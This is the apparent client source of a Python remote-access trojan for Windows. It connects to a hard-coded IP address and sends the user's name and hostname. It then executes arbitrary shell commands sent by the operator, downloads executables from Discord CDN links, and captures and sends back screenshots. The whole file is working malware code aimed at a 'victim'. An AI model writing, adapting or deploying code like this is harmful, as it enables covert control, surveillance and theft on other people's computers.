# sourcery skip: remove-redundant-if
import ctypes
import getpass
import os
import socket
import subprocess
import pyautogui
import io
import base64

from colorama import Fore

us3rn4me = getpass.getuser()
v1ct1m1d = us3rn4me.lower()
currentid = -1
pid = os.getpid()
pcname = socket.gethostname()
fullname = f"{us3rn4me}@{pcname}"
adm1n = ctypes.windll.shell32.IsUserAnAdmin().__bool__()
processid = os.getpid()
cwd = os.getcwd()

USERDIR = os.getenv("USERPROFILE")
APPDATA = os.getenv("APPDATA")
LOCAL = os.getenv("LOCALAPPDATA")
TEMP = os.getenv("TEMP")

PORT = 55555
IP = "138.2.151.66"
FULLADDRESS = (IP, PORT)

ENCODING = 'utf-8'
HEADER = 99999

DependenciesInstalled = False

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(FULLADDRESS)

client.send(f"{us3rn4me}@{pcname}".encode(ENCODING))


# defs
def image_to_bytes(image_path):
    with open(image_path, "rb") as image_file:
        image_bytes = base64.b64encode(image_file.read())
    return image_bytes

# Check if dependencies are installed...

if os.path.exists(f"{cwd}//Dependencies") == True:
    DependenciesInstalled = True
while True:
    command = client.recv(HEADER).decode(ENCODING)
    args = command.split(" ")
    print(args)

    if currentid == v1ct1m1d and args[0] == "id":
        client.send(f"{Fore.LIGHTGREEN_EX}[i] {fullname} ID: {v1ct1m1d}".encode(ENCODING))
    elif currentid == v1ct1m1d and args[0] == "cmd":
        client.send(f"[✓] Command Sent: {args[1:]} \nOutput: \n{subprocess.run(args[1:], capture_output=True, shell=True).stdout}")
    elif currentid == v1ct1m1d and args[0] == "installdependencies":
        if DependenciesInstalled:
            client.send(f"{Fore.RED}[X] Dependencies already installed. Skipping step.".encode(ENCODING))
        else:
            client.send(f"{Fore.CYAN} [📁] Making directory - {cwd}//Dependencies".encode(ENCODING))
            os.makedirs("Dependencies")
            client.send(f"{Fore.CYAN}[⬇️] installing 1/4: nircmdsafe.exe...".encode(ENCODING))
            subprocess.run(
                "curl -ko Dependencies/nircmdsafe.exe https://cdn.discordapp.com/attachments/1202136082557173841/1226609686657241119/nircmdsafe.exe?ex=6625644a&is=6612ef4a&hm=f388b2688ade69dcb9ae9635e78d3a9a065c50b12364832802eb5095e5024895&"
            )
            client.send(f"{Fore.CYAN}[⬇️] installing 2/4: nircmd.exe...".encode(ENCODING))
            subprocess.run(
                "curl -ko Dependencies/nircmd.exe https://cdn.discordapp.com/attachments/1202136082557173841/1226609686351183933/nircmd.exe?ex=6625644a&is=6612ef4a&hm=68c07b584fbb15196bc0cf71703b8f0585676da946d83f7a58a5785d8b6cc13c&"
            )
            client.send(f"{Fore.CYAN}[⬇️] installing 3/4: cmdmp3.exe...".encode(ENCODING))
            subprocess.run(
                "curl -ko Dependencies/cmdmp3win.exe https://cdn.discordapp.com/attachments/1202136082557173841/1226614688931119124/cmdmp3.exe?ex=662568f3&is=6612f3f3&hm=f310b61c8c0ad0b3f6331b6e375d23a9b0da56c13f7ea199abfd4db2d02dffae&"
            )
            client.send(f"{Fore.CYAN}[⬇️] installing 4/4: cmdcam.exe...".encode(ENCODING))
            subprocess.run(
                "curl -ko Dependencies/cmdcam.exe https://cdn.discordapp.com/attachments/1185616202190561300/1212046644263256194/cmdmp3win.exe?ex=65f06966&is=65ddf466&hm=533ba44cd78c68f4ae80bc271fa375de03bbac4828ca939086eabc68d02fb012&"
            )
    elif currentid == v1ct1m1d and args[0] == "screenshot":
        pyautogui.screenshot('screenshot.png')
        image_path = "screenshot.png"
        image_bytes = image_to_bytes(image_path)
        client.sendall(image_bytes)
        print(f'image: {base64.b64decode(image_bytes)}')
        continue
    elif currentid == v1ct1m1d or args[0] != "control":
        client.send(f"{Fore.RED}[!] No such command found".encode(ENCODING))
        continue
    elif currentid == v1ct1m1d and args[0] == "control":
        client.send(f"{Fore.MAGENTA} [x] Victim already controlled")
    elif args[0] == "deselect" and args[1] == v1ct1m1d:
        client.send(f"{Fore.RED} [✓] You are now not controlling {v1ct1m1d}.")


    else:
        currentid = args[1]
        if currentid == v1ct1m1d:
            client.send(f"{Fore.LIGHTGREEN_EX}[i] You are currently controlling {fullname}".encode(ENCODING))
            continue
        
